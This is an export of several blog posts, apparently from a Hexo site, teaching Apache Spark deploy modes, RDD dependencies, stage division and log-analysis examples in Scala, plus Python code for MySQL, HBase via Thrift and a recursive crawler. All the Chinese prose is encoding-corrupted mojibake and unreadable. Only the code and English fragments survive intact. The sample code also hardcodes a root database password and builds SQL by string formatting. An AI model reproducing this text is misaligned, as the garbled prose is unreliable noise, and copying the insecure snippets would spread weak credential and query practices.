ä½¿ç”¨YARNæ¨¡å¼çš„æ—¶å€™ï¼Œä¸éœ€è¦å¯åŠ¨masterå’Œworkeräº†ã€‚ åªéœ€è¦å¯åŠ¨HDFSå’ŒYARNå³å¯ã€‚ ä¸ Standaloneä¸»è¦åŒºåˆ«æ˜¯: spark-submitåé¢çš„å‚æ•°ä¸­--masteråé¢çš„ä¸æ˜¯ spark://â€¦., è€Œæ˜¯ yarn, è¿™æ ·:--master yarn â€“deploy-mode client â€“deploy-mode cluster å. å®½çª„ä¾èµ–çª„ä¾èµ–æ˜¯æŒ‡çˆ¶RDDçš„æ¯ä¸ªåˆ†åŒºéƒ½åªè¢«å­RDDä¸€ä¸ªåˆ†åŒºä½¿ç”¨ã€‚(ç‹¬ç”Ÿ, NarrowDependency) å®½ä¾èµ–å°±æ˜¯æŒ‡çˆ¶RDDçš„åˆ†åŒºè¢«å¤šä¸ªå­RDDçš„åˆ†åŒºæ‰€ä¾èµ–ã€‚ (è¶…ç”Ÿ, ShuffleDependency) åä¸€. Stage åˆ’åˆ†å¼€å‘å®Œä¸€ä¸ªåº”ç”¨ä»¥åï¼ŒæŠŠåº”ç”¨æäº¤åˆ°é›†ç¾¤ï¼Œé‚£ä¹ˆè¿™ä¸ªåº”ç”¨å°±å«åšApplication è¿™ä¸ªåº”ç”¨é‡Œé¢æˆ‘ä»¬å¼€å‘äº†å¥½å¤šä»£ç ï¼Œè¿™äº›ä»£ç é‡Œé¢å‡¡æ˜¯é‡åˆ°ä¸€ä¸ªactionæ“ä½œï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªjobä»»åŠ¡ã€‚ ä¹Ÿå°±æ„å‘³ç€ï¼Œä¸€ä¸ªApplicationæœ‰ä¸€ä¸ªæˆ–è€…ä¸€ä¸ªä»¥ä¸Šçš„jobä»»åŠ¡ã€‚ ç„¶åè¿™äº›jobä»»åŠ¡åˆ’åˆ†ä¸ºä¸åŒstageå»æ‰§è¡Œï¼Œstageé‡Œé¢å°±æ˜¯è¿è¡Œä¸åŒçš„taskä»»åŠ¡ã€‚ é‡åˆ°ä¸€ä¸ª shuffle ç®—å­, å°±ä¼šä»ä¸­é—´åˆ†å¼€, åˆ’åˆ†ä¸º2ä¸ª stage Taskè®¡ç®—çš„å°±æ˜¯åˆ†åŒºä¸Šé¢çš„æ•°æ®ã€‚ åäºŒ. Spark ä»»åŠ¡è°ƒåº¦Shuffle æœºåˆ¶è§ä¸‹ä¸€ç¯‡ 1.ç®€ç‰ˆ 2.å®Œæ•´ç‰ˆ æ³¨æ„: AppClient / clientActorï¼šåœ¨ Standalone æ¨¡å¼ä¸‹çš„å®ç°æ˜¯ StandaloneAppClient ç±» dirverActor: :TODO åä¸‰. TopN æ¡ˆä¾‹å¯¹ä¸€ä¸ªæ–‡ä»¶é‡Œé¢çš„å•è¯è¿›è¡Œå•è¯è®¡æ•°ï¼Œç„¶åå–å‰3ä¸ªå‡ºç°æ¬¡æ•°æœ€å¤šçš„ä¸‰ä¸ªå•è¯ã€‚ 12345678910111213141516object TopN &#123; def main(args: Array[String]): Unit = &#123; val conf=new SparkConf().setMaster("local").setAppName("TopN") val sc=new SparkContext(conf); val file=sc.textFile("file://...") val topN=file.flatMap &#123; line =&gt; line.split("\t") &#125; .map &#123; word =&gt; (word,1) &#125; .reduceByKey(_+_) //key word value:count .map(tuple =&gt;(tuple._2,tuple._1)) // swap k,v .sortByKey(false) // sort the count .take(3) // take top 3 for( i &lt;- topN)&#123; println(i._2 + " å‡ºç°æ¬¡æ•°ï¼š"+i._1); &#125; &#125;&#125; åå››. ç½‘ç«™è®¿é—®æ—¥å¿—åˆ†æéœ€æ±‚åˆ†æéœ€æ±‚ä¸€ ï¼š The average, min, and max content size of responses returned from the server. éœ€æ±‚äºŒï¼š A count of response codeâ€™s returned. éœ€æ±‚ä¸‰ï¼š All IPAddresses that have accessed this server more than N times. éœ€æ±‚å››ï¼š The top endpoints requested by count. TopN æ‰¾å‡ºè¢«è®¿é—®æ¬¡æ•°æœ€å¤šçš„åœ°å€çš„å‰ä¸‰ä¸ª Data12345log.txt------------10.0.0.153#-#-#[12/Mar/2004:12:23:18-0800]#"GET /cgi-bin/mailgraph.cgi/mailgraph_3_err.png HTTP/1.1"#200#555410.0.0.153#-#-#[12/Mar/2004:12:23:40-0800]#"GET /dccstats/index.html HTTP/1.1"#304#200010.0.0.153#-#-#[12/Mar/2004:12:23:41-0800]#"GET /dccstats/stats-spam.1day.png HTTP/1.1"#200#2964 Code123456789101112131415161718192021222324class ApacheAccesslog-----------------------case class ApacheAccesslog( ipAddress:String, // ipåœ°å€ clientIndentd:String, //æ ‡è¯†ç¬¦ userId:String ,//ç”¨æˆ·ID dateTime:String ,//æ—¶é—´ method:String ,//è¯·æ±‚æ–¹å¼ endPoint:String ,//ç›®æ ‡åœ°å€ protocol:String ,//åè®® responseCode:Int ,//ç½‘é¡µè¯·æ±‚å“åº”ç±»å‹ contenSize:Long //å†…å®¹é•¿åº¦ )object ApacheAccesslog &#123; def parseLog(log:String):ApacheAccesslog=&#123; val logArray= log.split("#"); val url=logArray(4).split(" ") ApacheAccesslog(logArray(0),logArray(1),logArray(2),logArray(3),url(0),url(1),url(2),logArray(5).toInt,logArray(6).toLong); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162class LogAnalyer--------------------import org.apache.spark.SparkConfimport org.apache.spark.SparkContextobject LogAnalyer &#123; def main(args: Array[String]): Unit = &#123; val conf=new SparkConf().setMaster("local").setAppName("LogAnalyer") val sc=new SparkContext(conf); val logsRDD=sc.textFile("file://....") .map &#123; line =&gt; ApacheAccesslog.parseLog(line) &#125; .cache() /** * éœ€æ±‚ä¸€ * The average, min, and max content size of responses returned from the server. */ val contextSize=logsRDD.map &#123; log =&gt; log.contenSize &#125; // get max val maxSize=contextSize.max() //get min val minSize=contextSize.min() // total / count //get average val averageSize=contextSize.reduce(_+_)/contextSize.count() println("=============================éœ€æ±‚ä¸€-=============================="); println("æœ€å¤§å€¼ï¼š"+maxSize + " æœ€å°å€¼ï¼š"+minSize + " å¹³å‡å€¼ï¼š"+averageSize); /** * éœ€æ±‚äºŒ * A count of response code's returned. */ println("=============================éœ€æ±‚äºŒ-=============================="); logsRDD.map &#123; log =&gt; (log.responseCode,1) &#125; .reduceByKey(_+_) .foreach(result =&gt; println(" å“åº”çŠ¶æ€ï¼š"+result._1 + " å‡ºç°çš„æ¬¡æ•°ï¼š"+result._2)) /** * éœ€æ±‚ä¸‰ * All IPAddresses that have accessed this server more than N times. */ println("=============================éœ€æ±‚ä¸‰-=============================="); val result= logsRDD.map &#123; log =&gt;( log.ipAddress,1) &#125; .reduceByKey(_+_) .filter(result =&gt; result._2 &gt; 1) // &gt; 10000 .take(2) // &gt; 10 for( tuple &lt;- result)&#123; println("ip : "+tuple._1 + " å‡ºç°çš„æ¬¡æ•°ï¼š"+tuple._2); &#125; /** * éœ€æ±‚å›› * The top endpoints requested by count. TopN */ println("=============================éœ€æ±‚å››-=============================="); val topN=logsRDD.map &#123; log =&gt; (log.endPoint,1) &#125; .reduceByKey(_+_) .map(result =&gt; (result._2,result._1)) .sortByKey(false) .take(2) for(tuple &lt;- topN)&#123; println("ç›®æ ‡åœ°å€ : "+tuple._2 + " å‡ºç°çš„æ¬¡æ•°ï¼š"+tuple._1); &#125; logsRDD.unpersist(true) &#125;&#125;]]></content>
      <categories>
        <category>Spark</category>
        <category>ç²¾è®²</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i-Spark-5]]></title>
    <url>%2F2018%2F07%2F25%2FSpark%2Fi-Spark-5%2F</url>
    <content type="text"><![CDATA[ä¸€. Spark çš„é—­åŒ…å¤„ç†RDD, resilient distributed dataset,å¼¹æ€§(å®¹é”™)åˆ†å¸ƒå¼æ•°æ®é›†ã€‚ åˆ†åŒºåˆ—è¡¨, function,dep Option(åˆ†åŒºç±», Pair[Key,Value]),é¦–é€‰ä½ç½®ã€‚ è¿è¡Œjobæ—¶ï¼Œsparkå°†rddæ‰“ç¢å˜æ¢æˆtask,æ¯ä¸ªtaskç”±ä¸€ä¸ªexecutoræ‰§è¡Œã€‚ æ‰§è¡Œä¹‹å‰ï¼Œsparkä¼šè¿›è¡Œtaskçš„é—­åŒ…(closure)è®¡ç®—ã€‚ é—­åŒ…æ˜¯æŒ‡é’ˆå¯¹executorå¯è§çš„å˜é‡å’Œæ–¹æ³•,ä»¥å¤‡åœ¨rddçš„foreachä¸­è¿›è¡Œè®¡ç®—ã€‚ é—­åŒ…å°±æ˜¯ä¸²è¡ŒåŒ–åå¹¶å‘é€ç»™æ¯ä¸ªexecutor. localæ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰sparkç¨‹åºè¿è¡Œåœ¨åŒä¸€JVMä¸­ï¼Œå…±äº«å¯¹è±¡ï¼Œcounteræ˜¯å¯ä»¥ç´¯åŠ çš„ã€‚ åŸå› æ˜¯æ‰€æœ‰executoræŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¼•ç”¨ã€‚ clusteræ¨¡å¼ä¸‹ï¼Œä¸å¯ä»¥ï¼Œcounteræ˜¯é—­åŒ…å¤„ç†çš„ã€‚ æ¯ä¸ªèŠ‚ç‚¹å¯¹driverä¸Šçš„counteræ˜¯ä¸å¯è§çš„ã€‚ åªèƒ½çœ‹åˆ°è‡ªå·±å†…éƒ¨ä¸²è¡ŒåŒ–çš„counterå‰¯æœ¬ã€‚ äºŒ. Sparkçš„åº”ç”¨çš„ éƒ¨ç½²æ¨¡å¼1. éƒ¨ç½²æ¨¡å¼æ¦‚è¿°spark-submit --class xxx xx.jar --deploy-mode (client | cluster) --deploy-modeæŒ‡å®šéƒ¨ç½²driverç¨‹åºåœ¨clientä¸»æœºä¸Šè¿˜æ˜¯åœ¨workerèŠ‚ç‚¹ä¸Šã€‚ [client] driverè¿è¡Œåœ¨clientä¸»æœºä¸Šã€‚ clientå¯ä»¥ä¸åœ¨cluster(é›†ç¾¤)ä¸­ã€‚ [cluster] driverç¨‹åºæäº¤ç»™spark clusterçš„æŸä¸ªworkerèŠ‚ç‚¹æ¥æ‰§è¡Œã€‚ workeræ˜¯clusterä¸­çš„ä¸€å‘˜ã€‚ å¯¼å‡ºçš„jaréœ€è¦æ”¾ç½®åˆ°æ‰€æœ‰workerèŠ‚ç‚¹éƒ½å¯è§çš„ä½ç½®(å¦‚hdfs)æ‰å¯ä»¥ã€‚ ä¸è®ºå“ªç§æ–¹å¼ï¼Œrddçš„è¿ç®—éƒ½åœ¨workeræ‰§è¡Œ 2. deploy modeéƒ¨ç½²æ¨¡å¼éªŒè¯éƒ¨ç½²æ¨¡å¼åˆ’åˆ† Client(å®¢æˆ·ç«¯æ¨¡å¼) spark-submit --class com.rox.spark.scala.DeployModeTest --master [spark://cs1:7077](spark://s201:7077) --deploy-mode client SparkDemo-1-deploymode.jar driverå°±æ˜¯è‡ªå·±, å¦‚æœåœ¨cs1ä¸Š, driver å°±æ˜¯cs1 Cluster(é›†ç¾¤æ¨¡å¼) spark-submit --class com.it18zhang.spark.scala.DeployModeTest --master [spark://cs1:7077](spark://s201:7077) --deploy-mode cluster [hdfs://cs1:8020/user/centos/SparkDemo-1-deploymode.jar](hdfs://s201:8020/user/centos/SparkDemo1-1.0-SNAPSHOT.jar) driveræ˜¯ç”± spark æŒ‘é€‰çš„,å¦‚æœæ˜¯ cs1ä¸Šæäº¤çš„,å› ä¸º cs1ä¹Ÿä¸æ˜¯ worker(slave), æ‰€ä»¥ driverå’Œ worker éƒ½è·Ÿcs1æ— å…³, æ³¨æ„, cluster æ¨¡å¼,åªè¦ä¸€æäº¤å®Œå°±ç»“æŸäº†, å› ä¸ºæ¥ä¸‹æ¥è·Ÿä»–è‡ªå·±æ²¡å…³ç³»äº† , æ‰€ä»¥æ­¤æ—¶åœ¨ cs1ä¸Šæ‰§è¡Œçš„éå¸¸å¿« å¿…é¡»è¦å°†jaræ”¾ç½®åˆ°æ‰€æœ‰workeréƒ½èƒ½å¤Ÿçœ‹åˆ°çš„åœ°æ–¹æ‰å¯ä»¥ï¼Œä¾‹å¦‚hdfsã€‚ ä»£ç è§£é‡Š é€šè¿‡SocketæŠŠæ‰“å°çš„æ•°æ®, å‘é€åˆ°æŒ‡å®šæœºå™¨cs5ä¸Š åœ¨cs5ä¸Š, å¼€å¯ ncç«¯å£, ç›‘å¬æ¶ˆæ¯ standalone å’Œ yarnæ¨¡å¼åˆ†åˆ«æ‰“æˆ jaråŒ…, åœ¨spark ç¯å¢ƒä¸­æ‰§è¡Œ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.rox.spark.scalaimport java.net.&#123;InetAddress, Socket&#125;import org.apache.spark.&#123;SparkConf, SparkContext&#125;object DeployModeTest &#123; /** * writeå†™å‡ºå» * ä»è¿è¡Œ æ­¤ç¨‹åºçš„èŠ‚ç‚¹, å†™åˆ° cs5 ä¸Š * @param str */ def printInfo(str:String):Unit = &#123; val ip = InetAddress.getLocalHost.getHostAddress val sock = new Socket("cs5",8888) val out = sock.getOutputStream out.write((ip + "" + str + "\r\n").getBytes()) out.flush() sock.close() &#125; def main(args: Array[String]): Unit = &#123; val conf = new SparkConf() conf.setAppName("DeployModeTest") // standalone æ¨¡å¼ //conf.setMaster("spark://cs1:7077") // Yarnæ¨¡å¼ conf.setMaster("yarn") // local æ¨¡å¼ // conf.setMaster("local[4]") val sc = new SparkContext(conf) printInfo("hello guys---æˆ‘å°±æ˜¯Driver") /** * Distribute a local Scala collection to form an RDD. * numSlices: the partition number of the new RDD. */ val rdd1 = sc.parallelize(1 to 10, 3) // æ‰“å°ç¬¬ä¸€æ¬¡map val rdd2 = rdd1.map(e =&gt; &#123; printInfo("ç›´æ¥å®šä¹‰3ä¸ªåˆ†åŒº, map1: "+e) e * 2 &#125;) // é‡æ–°åˆ†åŒºä¸º 2 val rdd3 = rdd2.repartition(2) // val rdd4 = rdd3.map(e =&gt; &#123; printInfo("é‡åˆ†åŒºä¸º2å, map2: " + e) e &#125;) val res = rdd4.reduce((a,b)=&gt;&#123; printInfo("æ±‚å’Œ, reduce: " + a + "," + b) a + b &#125;) println(res) printInfo("æœ€åå‘ç»™driver: " + res) &#125;&#125; ä¸‰. Spark é›†ç¾¤çš„è¿è¡Œæ–¹å¼ä¸»è¦æ˜¯cluster managerçš„åŒºåˆ«ã€‚ [local] â€¦ [standalone] ä½¿ç”¨SparkMasterè¿›ç¨‹ä½œä¸ºç®¡ç†èŠ‚ç‚¹, éœ€è¦å¼€å¯Spark é›†ç¾¤ [mesos] ä½¿ç”¨mesosçš„masterä½œä¸ºç®¡ç†èŠ‚ç‚¹ã€‚ [yarn] ä½¿ç”¨hadoopçš„ResourceManagerä½œä¸ºmasterèŠ‚ç‚¹ã€‚ ä¸ç”¨å¼€å¯ spark é›†ç¾¤ã€‚å› ä¸ºæ˜¯ä¾æ‰˜yarn é›†ç¾¤æ¥æ‰§è¡Œspark application, é«˜å¯ç”¨ä¹Ÿæ˜¯ä¾æ‰˜äº yarn çš„é«˜å¯ç”¨, ç¨‹åºåœ¨æ‰§è¡Œæ—¶, ä¼šæ‹·è´ ä¸€äº›spark ä¾èµ–ç¯å¢ƒåˆ° hdfs ä¸Š, äº‹åä¼šåˆ é™¤]]></content>
      <categories>
        <category>Spark</category>
        <category>éƒ¨ç½²æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python & Hadoop | Spark ç”Ÿæ€]]></title>
    <url>%2F2018%2F07%2F23%2FSpark%2FPython%20%26%20Hadoop%7CSpark%E7%94%9F%E6%80%81%2F</url>
    <content type="text"><![CDATA[ä¸€. Python è®¿é—® MySQL1.å®‰è£… pymysql æ¨¡å—1) ideaä¸­, import pymysql, æ²¡æœ‰å®‰è£…çš„è¯, option + return å®‰è£… 2. è®¿é—® mysql æµ‹è¯•çœ‹çœ‹èƒ½å¦æ‰“å° mysql çš„ç‰ˆæœ¬ 1234567891011121314151617181920212223#!/usr/bin/python3# -*-coding:utf-8-*-import pymysqltry: # å¼€å¯é“¾æ¥ conn = pymysql.connect(host='localhost',user='root',passwd='123', db='python',port=3306,charset='utf8') # æ‰“å¼€æ¸¸æ ‡ cur = conn.cursor() # æ‰§è¡Œ sql cur.execute('select version()') version = cur.fetchone() print(version) cur.close() conn.close()except Exception: print("å‘ç”Ÿå¼‚å¸¸") 3. æŸ¥è¯¢ mysql123456789101112131415161718192021222324252627282930#!/usr/bin/python3# -*-coding:utf-8-*-import pymysqltry: # å¼€å¯é“¾æ¥ conn = pymysql.connect(host='localhost',user='root',passwd='123', db='python',port=3306,charset='utf8') # æ‰“å¼€æ¸¸æ ‡ cur = conn.cursor() sql = "select id, name,age from t1 where name like 'tom8%'" # æ‰§è¡Œ sql cur.execute(sql) # å–ç»“æœ all = cur.fetchall() for rec in all: print(rec) # print(str(rec[0])) conn.commit() cur.close() conn.close()except Exception: print("å‘ç”Ÿå¼‚å¸¸") 4. å¤§æ‰¹é‡æ’å…¥ mysql12345678910111213141516171819202122232425#!/usr/bin/python3# -*-coding:utf-8-*-import pymysqltry: # å¼€å¯é“¾æ¥ conn = pymysql.connect(host='localhost',user='root',passwd='123', db='python',port=3306,charset='utf8') # æ‰“å¼€æ¸¸æ ‡ cur = conn.cursor() i = 0 while i &lt; 10000: sql = "insert into t1(name,age) VALUES ('%s','%d')" % ('tom' + str(i), i % 100) print(sql) cur.execute(sql) i += 1 conn.commit() cur.close() conn.close()except Exception: print("å‘ç”Ÿå¼‚å¸¸") 5. æ‰§è¡Œäº‹åŠ¡å…³é—­ autocommit 12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/python3# -*-coding:utf-8-*-import pymysqltry: # å¼€å¯è¿æ¥ conn = pymysql.connect(host='localhost',user='root',passwd='123',db='python',port=3306,charset='utf8') # å…³é—­è‡ªåŠ¨æäº¤ conn.autocommit(False) #å¼€å¯äº‹åŠ¡ conn.begin() # æ‰“å¼€æ¸¸æ ‡ cur = conn.cursor() # åˆ é™¤ sql = "delete from t1 WHERE id &gt; 20000" # æ”¹ sql = "update t1 set age = age -1 where age &gt;=50 " # èšåˆ sql = "select count(*) from t1 where age &lt; 20" # æ‰§è¡Œ sql cur.execute(sql) # æœ‰ç»“æœçš„, æ‰§è¡Œå®Œåéœ€è¦fetchç»“æœ res = cur.fetchone() print(res[0]) # æäº¤è¿æ¥ conn.commit() # å…³é—­æ¸¸æ ‡ cur.close()except Exception: print("å‘ç”Ÿå¼‚å¸¸") conn.rollback()finally: conn.close() äºŒ. Spark ç¯å¢ƒä½¿ç”¨ Python æ“ä½œ HBase1. ç¯å¢ƒå‡†å¤‡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152530.å¯åŠ¨hbaseé›†ç¾¤---------------------------------------------------------------------å¦‚æœæ—¶é’Ÿä¸åŒæ­¥ã€‚$&gt;su root$&gt;xcall.sh "ntpdate asia.pool.ntp.org"å½“ç„¶, ä¹Ÿå¯ä»¥è®¾ç½®è„šæœ¬è‡ªåŠ¨åŒæ­¥, è¯¦ç»†è§æˆ‘çš„ hadoopHA ç¯å¢ƒæ­å»º1.åœ¨ HBase ç›®å½•ä¸‹,å¯åŠ¨hbaseçš„thriftserverï¼Œæ»¡è¶³å’Œç¬¬ä¸‰æ–¹åº”ç”¨é€šä¿¡ã€‚---------------------------------------------------------------------$&gt;hbase-daemon.sh start thrift22.æŸ¥çœ‹WebUI---------------------------------------------------------------------/# webuiç«¯å£ , 9090 rpcç«¯å£http://cs1:9095/ 3.å®‰è£…macä¸‹thriftçš„ç¼–è¯‘å™¨---------------------------------------------------------------------brew install thrift4.ä¸‹è½½å¹¶å®‰è£…thriftçš„pythonæ¨¡å—.---------------------------------------------------------------------import thrift ==&gt;æ²¡æœ‰çš„è¯, option + return å®‰è£…5.æ‰¾åˆ°hbase.thriftæ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œäº§ç”Ÿpythonæ–‡ä»¶ã€‚---------------------------------------------------------------------ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘cmd&gt; thrift -o ./out -gen py hbase.thriftç”Ÿæˆåçš„è·¯å¾„åœ¨è¿™é‡Œ: /Users/shixuanji/Documents/èµ„æº/JaråŒ…/HBase/out/gen-py6.åˆ›å»ºideaçš„ä¸‹çš„æ–°æ¨¡å—---------------------------------------------------------------------7.åˆ›å»ºpythonæ–‡ä»¶Demo1.py---------------------------------------------------------------------8.å¤åˆ¶ç”Ÿæˆpythonæ–‡ä»¶åˆ°ideaä¸‹ã€‚---------------------------------------------------------------------mythrift/hbase/..9.æ§åˆ¶å°ç¯å¢ƒæµ‹è¯•--------------------------------------------------------------------- ç§»é™¤spark/conf/core-site.xml | hdfs-site.xml | hive-site.xmlæ–‡ä»¶ [scala] ~/apps/spark/bin &lt;spark-shell&gt; val rdd = sc.makeRDD(1 to 10) rdd.map(e=&gt;(e,1)) [python] ~/apps/spark/bin &lt;pyspark&gt; arr = [1,2,3,4] rdd = sc.parallelize(arr); rdd.map(lambda e : (e,1)) 2.å…·ä½“ä»£ç 2.1 å¯¹ hbase çš„å¢åˆ æ”¹æŸ¥https://github.com/airpoet/bigdata/blob/master/Spark_Project/HBasePythonDemo/BasicPyHbase.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- encoding=utf-8 -*-import os#å¯¼å…¥thriftçš„pythonæ¨¡å—from thrift import Thriftfrom thrift.transport import TSocketfrom thrift.transport import TTransportfrom thrift.protocol import TBinaryProtocol#å¯¼å…¥è‡ªå·²ç¼–è¯‘ç”Ÿæˆçš„hbase pythonæ¨¡å—from mythrift.hbase import THBaseServicefrom mythrift.hbase.ttypes import *from mythrift.hbase.ttypes import TResult#åˆ›å»ºSocketè¿æ¥ï¼Œåˆ°s201:9090transport = TSocket.TSocket('cs1', 9090)transport = TTransport.TBufferedTransport(transport)protocol = TBinaryProtocol.TBinaryProtocol(transport)client = THBaseService.Client(protocol)#æ‰“å¼€ä¼ è¾“ç«¯å£!!!transport.open()# putæ“ä½œtable = b'ns1:t1'row = b'row1'v1 = TColumnValue(b'f1', b'id', b'101')v2 = TColumnValue(b'f1', b'name', b'tomas')v3 = TColumnValue(b'f1', b'age', b'12')vals = [v1, v2, v3]put = TPut(row, vals)client.put(table, put)print("okkkk!!")transport.close()#gettable = b'ns1:t1'rowkey=b"row1"col_id = TColumn(b"f1",b"id")col_name = TColumn(b"f1",b"name")col_age = TColumn(b"f1",b"age")cols = [col_id,col_name,col_age]get = TGet(rowkey,cols)res = client.get(table,get)print(bytes.decode(res.columnValues[0].qualifier))print(bytes.decode(res.columnValues[0].family))print(res.columnValues[0].timestamp)print(bytes.decode(res.columnValues[0].value))#deletetable = b'ns1:t1'rowkey = b"row1"col_id = TColumn(b"f1", b"id")col_name = TColumn(b"f1", b"name")col_age = TColumn(b"f1", b"age")cols = [col_id, col_name]#æ„é€ åˆ é™¤å¯¹è±¡delete = TDelete(rowkey,cols)res = client.deleteSingle(table, delete)transport.close()print("ok")# Scantable = b'ns1:t12'startRow = b'1530357094900-43dwMLjxI5-0'stopRow = b'1530357183537-43dwMLjxI5-6'payload = TColumn(b"f1", b"payload")cols = [payload]scan = TScan(startRow=startRow,stopRow=stopRow,columns=cols)# è¿™é‡Œå¦‚æœä¸ä¼  stopRow å°±æ˜¯æ‰«æåˆ°ç»“å°¾scan = TScan(startRow=startRow, columns=cols)r = client.getScannerResults(table,scan,100);for x in r: print("============") print(bytes.decode(x.columnValues[0].qualifier)) print(bytes.decode(x.columnValues[0].family)) print(x.columnValues[0].timestamp) print(bytes.decode(x.columnValues[0].value)) 2.2 å°†çˆ¬è™«çˆ¬å–çš„ç½‘é¡µå­˜å…¥ hbasehttps://github.com/airpoet/bigdata/blob/master/Spark_Project/HBasePythonDemo/Crawler2HBase.py ï£¿ï£¿ï£¿ï£¿ï£¿ CrawerPageDao.py ï£¿ï£¿ï£¿ï£¿ï£¿ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/python3# -*-coding:utf-8-*-import os# å¯¼å…¥thriftçš„pythonæ¨¡å—from thrift import Thriftfrom thrift.transport import TSocketfrom thrift.transport import TTransportfrom thrift.protocol import TBinaryProtocol# å¯¼å…¥è‡ªå·²ç¼–è¯‘ç”Ÿæˆçš„hbase pythonæ¨¡å—from mythrift.hbase import THBaseServicefrom mythrift.hbase.ttypes import *from mythrift.hbase.ttypes import TResultimport base64'''åˆ›å»ºSocketè¿æ¥ï¼Œåˆ°s201:9090'''transport = TSocket.TSocket('cs1', 9090)transport = TTransport.TBufferedTransport(transport)protocol = TBinaryProtocol.TBinaryProtocol(transport)client = THBaseService.Client(protocol)'''å®šä¹‰å‡½æ•°ï¼Œä¿å­˜ç½‘é¡µ'''def savePage(url,page): #å¼€å¯è¿æ¥ transport.open() #å¯¹urlè¿›è¡Œbase64ç¼–ç ï¼Œå½¢æˆbytes,ä½œä¸ºrowkey urlBase64Bytes = base64.encodebytes(url.encode("utf-8")) # putæ“ä½œ table = b'ns1:pages' rowkey = urlBase64Bytes v1 = TColumnValue(b'f1', b'page', page) vals = [v1] put = TPut(rowkey, vals) client.put(table, put) transport.close()'''åˆ¤æ–­ç½‘é¡µæ˜¯å¦å­˜åœ¨'''def exists(url): transport.open() # å¯¹urlè¿›è¡Œbase64ç¼–ç ï¼Œå½¢æˆbytes,ä½œä¸ºrowkey urlBase64Bytes = base64.encodebytes(url.encode("utf-8")) print(urlBase64Bytes) table = b'ns1:pages' rowkey = urlBase64Bytes col_page = TColumn(b"f1",b"page") cols = [col_page] get = TGet(rowkey,cols) res = client.get(table, get) transport.close() return res.row is not None ï£¿ï£¿ï£¿ï£¿ï£¿ Crawler2HBase.py ï£¿ï£¿ï£¿ï£¿ï£¿ 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/python3# -*-coding:utf-8-*-# é¦–å…ˆåˆ›å»º hbase è¡¨: pages# $hbase&gt; create 'ns1:pages','f1'import urllib.requestimport osimport reimport CrawerPageDao#ä¸‹è½½ç½‘é¡µæ–¹æ³•def download(url): #åˆ¤æ–­å½“å‰çš„ç½‘é¡µæ˜¯å¦å·²ç»ä¸‹è½½ resp = urllib.request.urlopen(url) pageBytes = resp.read() resp.close if not CrawerPageDao.exists(url): CrawerPageDao.savePage(url, pageBytes); try: #è§£æç½‘é¡µçš„å†…å®¹ pageStr = pageBytes.decode("utf-8"); #è§£æhrefåœ°å€ pattern = u'&lt;a[\u0000-\uffff&amp;&amp;&lt;sup&gt;[href]]*href="([\u0000-\uffff&amp;&amp;&lt;/sup&gt;"]*?)"' res = re.finditer(pattern, pageStr) for r in res: addr = r.group(1); print(addr) if addr.startswith("//"): addr = addr.replace("//","http://"); #åˆ¤æ–­ç½‘é¡µä¸­æ˜¯å¦åŒ…å«è‡ªå·±çš„åœ°å€ if addr.startswith("http://") and url != addr and (not CrawerPageDao.exists(addr)): download(addr) ; except Exception as e: print(e) print(pageBytes.decode("gbk", errors='ignore')); return ;download("http://jd.com"); ä¸‰. ä½¿ç”¨pythonå®ç°sparkçš„æ•°æ®åˆ†æå‚è€ƒè¿™æœ¬ä¹¦, data ç­‰éƒ½æœ‰ä¸‹è½½åœ°å€ Apache Spark 2 for Beginners 1.ç¯å¢ƒå‡†å¤‡é¦–å…ˆå½“å‰pythonç¯å¢ƒå¿…é¡»å®‰è£…äº†è¿™äº›ç»„ä»¶, ç”±äºæˆ‘çš„macä¸Šå·²ç»è£…äº†, è¿™é‡Œå°±ä¸å†è£…äº† 123456789101.numpy cmd&gt;pip install -i https://pypi.tuna.tsinghua.edu.cn/simple numpy2.scipy pip install -i https://pypi.tuna.tsinghua.edu.cn/simple scipy3.matplotpy pip install -i https://pypi.tuna.tsinghua.edu.cn/simple matplotlib python -m pip install -U pip setuptools python -m pip install matplotlib 2.åœ¨ mac ç¯å¢ƒçš„ Spark ä¸‹ä¹Ÿå¯ä»¥åœ¨ Linux ä¸‹çš„å›¾å½¢ç•Œé¢ä¸­é€šè¿‡ terminal æ“ä½œ. ç›®å½•å»ºè®®ä¸è¦æœ‰ä¸­æ–‡, å¦åˆ™ä¼šæœ‰ä¸€äº›è­¦å‘Šç”šè‡³é”™è¯¯ æˆ‘çš„ç›®å½•åœ¨è¿™é‡Œ: /Users/shixuanji/Documents/èµ„æº/JaråŒ…/Spark/spark-2.1.3-bin-hadoop2.7/bin/pyspark è¿›å…¥æˆ‘çš„ iTerm2, è¿›å…¥pyspark 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394 #å¯¼å…¥sql from pyspark.sql import Row import matplotlib.pyplot as plt import numpy as np import pylab as P plt.rcdefaults() # Restore the rc params from Matplotlib's internal defaults dataDir ="file:///home/centos/ml-data/ml-1m/users.dat" lines = sc.textFile(dataDir) splitLines = lines.map(lambda l: l.split("::")) usersRDD = splitLines.map(lambda p: Row(id=p[0],gender=p[1],age=int(p[2]), occupation=p[3], zipcode=p[4])) usersDF = spark.createDataFrame(usersRDD) usersDF.createOrReplaceTempView("users") usersDF.show()#ç”Ÿæˆç›´æ–¹å›¾ ageDF = spark.sql("SELECT age FROM users") ageList = ageDF.rdd.map(lambda p: p.age).collect() 